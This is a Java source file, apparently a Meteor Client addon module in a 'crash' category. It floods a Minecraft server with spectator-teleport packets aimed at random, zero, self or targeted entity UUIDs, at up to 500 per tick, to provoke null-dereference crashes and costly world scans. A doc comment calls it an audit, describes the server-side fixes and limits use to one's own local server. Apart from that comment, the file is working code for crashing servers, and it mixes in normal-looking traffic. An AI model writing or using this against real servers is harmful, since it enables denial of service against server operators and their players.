package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.SpectatorTeleportC2SPacket;
import net.minecraft.util.hit.EntityHitResult;

import java.util.UUID;

/**
 * AUDIT: Spectator-Teleport Edge Cases
 *
 * Sends SpectatorTeleportC2SPacket (the "teleport to entity" used by spectator
 * mode) with UUIDs that resolve to nothing, to entities the server must look up
 * across the whole world, or to the player itself. The server resolves the UUID
 * to an Entity and teleports the spectator to it; edge cases:
 *
 *   - unknown/random UUID  → server-wide entity lookup that resolves to null;
 *     a handler that dereferences without a null check throws.
 *   - self UUID            → teleport-to-self / re-entrancy.
 *   - rapid distinct UUIDs → repeated full-world entity scans per tick.
 *
 * An entity resolved in another dimension or an unloaded chunk additionally
 * tests whether the teleport forces a cross-dimension move or a chunk load with
 * no validation.
 *
 * What a vulnerable server does: scans for and dereferences the target without
 * null/permission/state checks, or honours the teleport for a non-spectator.
 * What a hardened server does: rejects the packet unless the sender is truly in
 * spectator mode, null-checks the lookup, and bounds the resolution cost.
 * Fix: gate on server-side spectator state; null-check the resolved entity;
 * reject targets in unloaded chunks / other dimensions rather than force-loading.
 *
 * Best run while in spectator mode. Run against your OWN local server only.
 */
public class SpectatorTpEdge extends Module {
    public enum Mode { RANDOM_UUID, ZERO_UUID, SELF, LOOKED_AT }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").description("Which target UUID to send.")
        .defaultValue(Mode.RANDOM_UUID).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("teleports-per-tick").description("Spectator-teleport packets per tick.")
        .defaultValue(20).range(1, 500).sliderRange(1, 200).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public SpectatorTpEdge() {
        super(AddonTemplate.CRASH_CATEGORY, "spectator-tp-edge",
            "Sends spectator-teleport to unknown/self/cross-world UUIDs. Tests target resolution null-checks + spectator gating.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    private UUID target() {
        return switch (mode.get()) {
            case RANDOM_UUID -> UUID.randomUUID();
            case ZERO_UUID -> new UUID(0L, 0L);
            case SELF -> mc.player.getUuid();
            case LOOKED_AT -> {
                Entity e = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : null;
                yield e != null ? e.getUuid() : UUID.randomUUID();
            }
        };
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        for (int i = 0; i < perTick.get(); i++) {
            mc.player.networkHandler.sendPacket(new SpectatorTeleportC2SPacket(target()));
            packetsSent++;
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
